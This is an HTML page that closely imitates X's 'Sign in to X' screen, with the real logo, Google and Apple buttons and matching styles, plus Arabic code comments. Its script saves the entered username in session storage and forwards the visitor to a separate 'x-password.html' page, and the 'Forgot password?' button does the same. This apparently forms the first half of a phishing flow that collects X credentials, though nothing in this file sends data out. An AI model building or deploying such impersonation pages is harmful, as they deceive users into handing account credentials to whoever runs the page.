<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to X</title>
<style>
• { box-sizing: border-box; }
html, body {
margin: 0; padding: 0; background: #000; color: #e7e9ea;
font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-webkit-font-smoothing: antialiased;
}
body { min-height: 100vh; display: flex; justify-content: center; }
.page {
width: 100%; max-width: 600px; min-height: 100vh; padding: 0 32px;
display: flex; flex-direction: column; align-items: center; justify-content: center;
}
.card {
width: 100%; max-width: 364px; display: flex; flex-direction: column;
align-items: center; padding: 32px 0;
}
.logo { margin-bottom: 24px; line-height: 0; }
.logo svg { width: 32px; height: 32px; fill: #e7e9ea; }
h1 {
margin: 0 0 32px; font-size: 31px; line-height: 36px;
font-weight: 700; letter-spacing: -0.5px; text-align: center;
}
.oauth { width: 100%; display: flex; flex-direction: column; gap: 12px; }
.btn-white {
width: 100%; height: 40px; display: flex; align-items: center; justify-content: center;
gap: 8px; border: none; border-radius: 9999px; background: #fff; color: #0f1419;
font-size: 15px; font-weight: 700; font-family: inherit; cursor: pointer;
transition: background-color .15s ease;
}
.btn-white:hover { background: #e6e6e6; }
.btn-white svg { width: 18px; height: 18px; flex-shrink: 0; }
.divider { width: 100%; display: flex; align-items: center; gap: 8px; margin: 20px 0; }
.divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #2f3336; }
.divider span { color: #71767b; font-size: 15px; line-height: 20px; }
.field { position: relative; width: 100%; margin-bottom: 20px; }
.field input {
width: 100%; height: 56px; padding: 20px 8px 8px; background: #000; color: #e7e9ea;
font-family: inherit; font-size: 17px; line-height: 24px;
border: 1px solid #333639; border-radius: 4px; outline: none;
transition: border-color .15s ease, box-shadow .15s ease;
}
.field input:focus { border-color: #1d9bf0; box-shadow: inset 0 0 0 1px #1d9bf0; }
.field label {
position: absolute; left: 8px; top: 50%; transform: translateY(-50%);
color: #71767b; font-size: 17px; pointer-events: none;
transition: top .15s ease, font-size .15s ease, transform .15s ease, color .15s ease;
}
.field input:focus + label,
.field input:not(:placeholder-shown) + label {
top: 8px; transform: none; font-size: 13px;
}
.field input:focus + label { color: #1d9bf0; }
.field input.error { border-color: #f4212e; box-shadow: inset 0 0 0 1px #f4212e; }
.btn-next {
width: 100%; height: 40px; border: none; border-radius: 9999px;
background: #eff3f4; color: #0f1419; font-family: inherit;
font-size: 15px; font-weight: 700; cursor: pointer;
transition: background-color .15s ease;
}
.btn-next:hover { background: #d7dbdc; }
.forgot {
margin-top: 20px; background: none; border: 1px solid #536471;
border-radius: 9999px; height: 40px; padding: 0 16px;
display: flex; align-items: center; justify-content: center;
color: #e7e9ea; font-family: inherit; font-size: 15px; font-weight: 700;
cursor: pointer; transition: background-color .15s ease;
}
.forgot:hover { background: rgba(239, 243, 244, 0.1); }
.signup { margin: 40px 0 0; font-size: 15px; line-height: 20px; color: #71767b; text-align: center; }
.signup a { color: #1d9bf0; text-decoration: none; }
.signup a:hover { text-decoration: underline; }
@media (max-width: 480px) {
.page { padding: 0 20px; } h1 { font-size: 26px; line-height: 32px; } .card { padding: 24px 0; }
}
</style>
</head>
<body>
<main class="page">
<div class="card">
<div class="logo">
<svg viewBox="0 0 24 24" aria-hidden="true">
<path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
</svg>
</div>
<h1>Sign in to X</h1>

<div class="oauth">
<button type="button" class="btn-white">
<svg viewBox="0 0 48 48" aria-hidden="true">
<path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
<path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
<path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
<path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
</svg>
Sign in with Google
</button>
<button type="button" class="btn-white">
<svg viewBox="0 0 24 24" aria-hidden="true" fill="currentColor">
<path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
</svg>
Sign in with Apple
</button>
</div>

<div class="divider"><span>or</span></div>

<div class="field">
<input id="username" type="text" placeholder=" " autocomplete="username" spellcheck="false">
<label for="username">Phone, email, or username</label>
</div>

<!-- أضفنا id هنا -->
<button type="button" class="btn-next" id="nextBtn">Next</button>

<button type="button" class="forgot" id="forgotBtn">Forgot password?</button>

<p class="signup">Don't have an account? <a href="#">Sign up</a></p>
</div>
</main>

<!-- ⬇️ السكربت الجديد لربط الصفحتين ⬇️ -->
<script>
const input = document.getElementById('username');
const nextBtn = document.getElementById('nextBtn');

function goNext() {
const val = input.value.trim();
if (!val) {
input.classList.add('error');
input.focus();
return;
}
// نحفظ القيمة في الجلسة
sessionStorage.setItem('x_username', val);
// ننتقل للصفحة الثانية
window.location.href = 'x-password.html';
}

nextBtn.addEventListener('click', goNext);
input.addEventListener('keydown', (e) => { if (e.key === 'Enter') goNext(); });
input.addEventListener('input', () => input.classList.remove('error'));

document.getElementById('forgotBtn').addEventListener('click', () => {
const val = input.value.trim();
if (!val) { input.classList.add('error'); input.focus(); return; }
sessionStorage.setItem('x_username', val);
window.location.href = 'x-password.html';
});
</script>
</body>
</html>
